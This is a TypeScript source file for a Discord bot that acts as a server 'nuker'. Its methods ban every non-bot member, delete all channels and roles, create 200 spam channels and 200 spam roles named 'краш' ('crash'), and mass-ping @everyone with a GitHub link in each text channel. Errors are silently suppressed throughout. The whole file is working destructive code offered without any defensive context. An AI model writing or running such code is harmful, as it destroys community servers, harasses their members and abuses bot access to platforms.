import { Guild, ChannelType } from "discord.js";

export default class {
	guild: Guild;

	constructor(guild: Guild) {
		this.guild = guild;
	}

	banMembers(): void {
		const members = this.guild.members.cache.filter(
			(member) => !member.user.bot
		);

		members.forEach(async (member) => {
			await member.ban().catch(() => {});
		});
	}

	removeChannels(): void {
		this.guild.channels.cache.forEach(async (channel) => {
			await channel.delete().catch(() => {});
		});
	}

	removeRoles(): void {
		this.guild.roles.cache.forEach(async (role) => {
			await role.delete().catch(() => {});
		});
	}

	async channelsFlood(): Promise<void> {
		for (let i = 0; i < 200; i++) {
			await this.guild.channels
				.create({
					name: "краш",
					type: ChannelType.GuildText,
				})
				.catch(() => {});
		}
	}

	async everyoneFlood(): Promise<void> {
		for (const channel of this.guild.channels.cache.map((x) => x)) {
			if (channel.type !== ChannelType.GuildText) continue;

			await channel.send("@everyone https://github.com/xretic");
		}
	}

	async rolesFlood(): Promise<void> {
		for (let i = 0; i < 200; i++) {
			await this.guild.roles
				.create({
					name: "краш",
				})
				.catch(() => {});
		}
	}
}
